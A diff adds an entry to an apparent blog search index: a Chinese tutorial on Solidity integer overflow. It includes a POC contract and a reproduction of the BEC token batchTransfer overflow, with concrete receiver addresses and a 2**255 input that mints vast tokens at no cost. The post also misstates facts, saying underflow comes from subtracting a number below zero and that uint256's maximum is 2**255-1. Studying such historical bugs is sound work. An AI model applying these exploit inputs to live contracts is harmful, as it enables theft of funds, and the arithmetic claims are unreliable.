@@ -517,4 +517,38 @@
         <tag>区块链</tag>
       </tags>
   </entry>
+  <entry>
+    <title>合约溢出漏洞</title>
+    <url>/2022/06/09/%E5%90%88%E7%BA%A6%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="1、加法溢出">1、加法溢出</h3>
+<p><code>uint256</code>的值是<code>2**256</code></p>
+<p>如果输入的值是<code>2**256-1</code>然后在加任何一个大于0的无符号数字就会溢出变成<code>0</code></p>
+<p>比如<code>2**256-1</code> + <code>1</code> = <code>0</code></p>
+<p><code>2**256-1</code> + <code>2</code> = <code>1</code></p>
+<h3 id="2、减法溢出">2、减法溢出</h3>
+<p>如果<code>uint256</code>类型的变量是等于<code>0</code>的数，那么此时再减去一个小于<code>0</code>的数就会变成<code>2**256-1</code>的值</p>
+<h3 id="3、乘法溢出">3、乘法溢出</h3>
+<p>如果<code>uint256</code>类型的变量超过它的最大值(<code>2**255 - 1</code>)，最后就会回绕变成<code>0</code></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT  </span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="variable constant_">POC</span>&#123;</span><br><span class="line">    uint256 public _addnum;</span><br><span class="line">    uint256 public _subnum;</span><br><span class="line">    uint256 public _mulnum;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add_overflow</span>(<span class="params"></span>)&#123; <span class="comment">// 加法溢出</span></span><br><span class="line">        uint256 max = <span class="number">2</span>**<span class="number">256</span> - <span class="number">1</span>;</span><br><span class="line">        _addnum = max + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub_underflow</span>(<span class="params"></span>)&#123; <span class="comment">// 减法溢出</span></span><br><span class="line">        uint256 min = <span class="number">0</span>;</span><br><span class="line">        _subnum = min - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mul_overflow</span>(<span class="params"></span>)&#123; <span class="comment">// 乘法溢出</span></span><br><span class="line">        uint256 mul = <span class="number">2</span> ** <span class="number">255</span>;</span><br><span class="line">        _mulnum = mul * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609110929837.png" alt="image-20220609110929837"></p>
+<h2 id="实际攻击例子">实际攻击例子</h2>
+<h3 id="BEC-溢出案例">BEC 溢出案例</h3>
+<p><a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a></p>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609111121193.png" alt="image-20220609111121193"></p>
+<p>合约地址：<a href="https://eth.tokenview.com/cn/address/0xc5d105e63711398af9bbff092d4b6769c82f793d%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%9C%A8%E9%87%8C%E9%9D%A2%E8%8E%B7%E5%8F%96%E6%94%BE">https://eth.tokenview.com/cn/address/0xc5d105e63711398af9bbff092d4b6769c82f793d，代码在里面获取放</a><code>remix</code>里跑一下就行</p>
+<p>乘法溢出点在于他的<code>batchTransfer</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609113059622.png" alt="image-20220609113059622"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">batchTransfer</span>(<span class="params">address[] _receivers, uint256 _value</span>) public whenNotPaused returns (bool) &#123;</span><br><span class="line">  uint cnt = _receivers.<span class="property">length</span>;</span><br><span class="line">  uint256 amount = <span class="title function_">uint256</span>(cnt) * _value; <span class="comment">// 溢出点在这</span></span><br><span class="line">  <span class="built_in">require</span>(cnt &gt; <span class="number">0</span> &amp;&amp; cnt &lt;= <span class="number">20</span>); <span class="comment">// 这个cnt是地址的长度，最小不能小于0，最大不能大于20个地址</span></span><br><span class="line">  <span class="built_in">require</span>(_value &gt; <span class="number">0</span> &amp;&amp; balances[msg.<span class="property">sender</span>] &gt;= amount); <span class="comment">// 传入的_value值必须大于0 并且 转账的用户余额要大于或等于当前转账数</span></span><br><span class="line"></span><br><span class="line">  balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(amount);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; cnt; i++) &#123;</span><br><span class="line">      balances[_receivers[i]] = balances[_receivers[i]].<span class="title function_">add</span>(_value);</span><br><span class="line">      <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, _receivers[i], _value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署后在<code>_receivers</code>里放<code>[&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;,&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;]</code></p>
+<p>在<code>_value</code>里放 <code>&quot;57896044618658097711785492504343953926634992332820282019728792003956564819968&quot;</code>（2**255的值）</p>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609113315782.png" alt="image-20220609113315782"></p>
+<p>然后就可以看到 通过溢出 我只需要耗费<code>0</code>的代币就可以获取到<code>57896044618658097711785492504343953926634992332820282019728792003956564819968</code>个代币</p>
+]]></content>
+      <categories>
+        <category>Web3</category>
+      </categories>
+      <tags>
+        <tag>合约安全</tag>
+      </tags>
+  </entry>
 </search>
